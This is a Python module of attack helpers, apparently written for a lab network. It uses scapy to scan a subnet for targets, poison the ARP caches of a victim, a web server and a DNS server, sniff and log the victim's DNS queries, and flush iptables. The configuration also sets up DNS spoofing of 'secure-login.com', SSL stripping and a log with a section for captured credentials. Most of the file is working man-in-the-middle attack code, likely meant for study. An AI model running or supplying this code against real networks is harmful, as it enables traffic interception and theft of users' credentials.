"""
Functions and configurations used for the attacks.
"""

import scapy.all as scapy
import subprocess
import sys
import time
import threading
from datetime import datetime
import os

# Network Configuration
DNS_SERVER_IP = "192.168.50.30"    # IP of the targeted DNS server
WEB_SERVER_IP = "192.168.50.40"    # IP of the targeted webserver
ATTACKER_IP = "192.168.50.10"      # IP of the machine running the attack
INTERFACE = "eth1"                 # Network interface used in scapy commands
NETWORK_RANGE = "192.168.50.0/24"  # Subnet of the lab environment

# Log file for captured packets (Vagrant syncs /vagrant to workspace)
PACKET_LOG_FILE = "/vagrant/tools/captured_packets.log"

# DNS spoofing configuration
SPOOF_DOMAIN = "secure-login.com"  # Domain that gets spoofed
SPOOF_TO_IP = ATTACKER_IP          # IP where victim gets redirected
NGINX_ACCESS_LOG = "/var/log/nginx/access.log" # Nginx log file path

# SSL Stripping configuration
SSL_STRIP_PROXY_PORT = 8080



# ARP functions
def get_mac(ip):
    """Get MAC address for an IP via ARP request"""
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False, iface=INTERFACE)[0]
    return answered_list[0][1].hwsrc


def arp_poison(victim_ip, spoof_ip):
    """Send spoofed ARP packet to poison victim's ARP cache"""
    mac_target = get_mac(victim_ip)
    packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=mac_target, psrc=spoof_ip)
    ether_frame = scapy.Ether(dst=mac_target)
    scapy.sendp(ether_frame / packet, verbose=False, iface=INTERFACE)


def restore_arp_table(destination_ip, source_ip):
    """Restore ARP table to original state"""
    destination_ip_mac = get_mac(destination_ip)
    source_ip_mac = get_mac(source_ip)
    ether_frame = scapy.Ether(dst=destination_ip_mac)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_ip_mac, 
                       psrc=source_ip, hwsrc=source_ip_mac)
    scapy.sendp(ether_frame / packet, count=5, verbose=False, iface=INTERFACE)


# IPTables functions
def cleanup_iptables():
    """Flush existing IPtables rules"""
    subprocess.run(["iptables", "--flush"], capture_output=True)
    subprocess.run(["iptables", "-t", "nat", "--flush"], capture_output=True)


# Packet sniffing and logging
def log_packet(message, payload=None, credential=None, body=None):
    """Log packet info to file and console with timestamps""" 
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] {message}"
    
    # Add new entry to log file
    try:
        with open(PACKET_LOG_FILE, "a") as f:
            f.write(log_entry + "\n")
            # Add payload to log if it exists
            if payload:
                f.write("-" * 40 + " PAYLOAD " + "-" * 40 + "\n")
                f.write(payload + "\n")
                f.write("-" * 89 + "\n\n")
            # Add credentials if captured
            if credential:
                f.write("-" * 40 + " CREDENTIALS " + "-" * 40 + "\n")
                f.write(credential + "\n")
                f.write("-" * 89 + "\n\n")
            # Add response body if provided
            if body:
                f.write("-" * 40 + " BODY " + "-" * 43 + "\n")
                f.write(body + "\n")
                f.write("-" * 89 + "\n\n")

    except Exception as e:
        print(f"[ERROR] Could not write to log file: {e}")


def sniff_outgoing_packets(victim_ip):
    """Sniff packets from victim and log them to file"""  
    # Initialize log file
    try:
        with open(PACKET_LOG_FILE, "a") as f:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"\n{'='*60}\n")
            f.write(f"[{timestamp}] Packet capture started for {victim_ip}\n")
            f.write(f"{'='*60}\n")

    except Exception as e:
        print(f"[ERROR] Could not initialize log file: {e}")
    
    def packet_callback(packet):
        """"Handle DNS, HTTP, HTTPS packets"""
        # Check for DNS queries from victim
        if packet.haslayer(scapy.DNSQR):
            dns_query = packet[scapy.DNSQR]
            log_packet(f"[DNS] {victim_ip} -> {dns_query.qname.decode()}")
        
    print(f"+ Sniffing packets from {victim_ip}")
    print(f"+ Logging to: {PACKET_LOG_FILE}")

    # Start sniffing and call function on every packet recieved
    scapy.sniff(prn=packet_callback, filter=f"ip src {victim_ip}", store=0, iface=INTERFACE)


# ARP Poisoning Attack
def run_arp_poisoning(victim):
    """Run ARP poisoning attack"""
    # Start sniffing thread
    sniff_thread = threading.Thread(target=sniff_outgoing_packets, args=(victim,), daemon=True)
    sniff_thread.start()

    # Start ARP poisoning
    print(f"+ Starting ARP poisoning: {WEB_SERVER_IP} <-> {victim} <-> {DNS_SERVER_IP}")
    try:
        while True:
            arp_poison(victim, WEB_SERVER_IP)
            arp_poison(WEB_SERVER_IP, victim)
            arp_poison(victim, DNS_SERVER_IP)
            arp_poison(DNS_SERVER_IP, victim)
            time.sleep(2)

    # Clean up when program is stopped
    except KeyboardInterrupt:
        print("\n- Stopping attack")
        print("- Restoring ARP tables")
        restore_arp_table(victim, WEB_SERVER_IP)
        restore_arp_table(WEB_SERVER_IP, victim)
        restore_arp_table(victim, DNS_SERVER_IP)
        restore_arp_table(DNS_SERVER_IP, victim)
        print("- Cleaning up iptables")
        cleanup_iptables()
        print("- Attack stopped")


# Target and attack type selection
def select_target():
    """Scan network for available devices and let user select target"""
    print("+ Scanning network for available targets:")

    try:
        request = scapy.ARP(pdst=NETWORK_RANGE)
        ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = ether / request
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False, iface=INTERFACE)[0]

        hosts = []
        for sent, received in answered_list:
            hosts.append({'ip': received.psrc, 'mac': received.hwsrc})
        
        print("\nDevices found in the network:")
        print("IP\t\t\tMAC Address\n" + "-" * 45)
        for host in hosts:
            print(f"{host['ip']}\t\t{host['mac']}")
        
        target = input("\nSelect the target IP address: ").strip()

        if target in [host['ip'] for host in hosts]:
            return target
        else:
            print("\n[Error] Invalid target")
            sys.exit(0)

    except KeyboardInterrupt:
        print("\n- Attack cancelled")
        sys.exit(0)


def select_attack_type():
    """Let user select attack type"""
    print("\nAvailable attacks:")
    print("1 - ARP + DNS spoofing")
    print("2 - ARP + SSL stripping")

    try:
        attack_type = input("\nSelect attack type: ").strip()
        return attack_type
    
    except KeyboardInterrupt:
        print("\n- Attack cancelled")
        sys.exit(0)
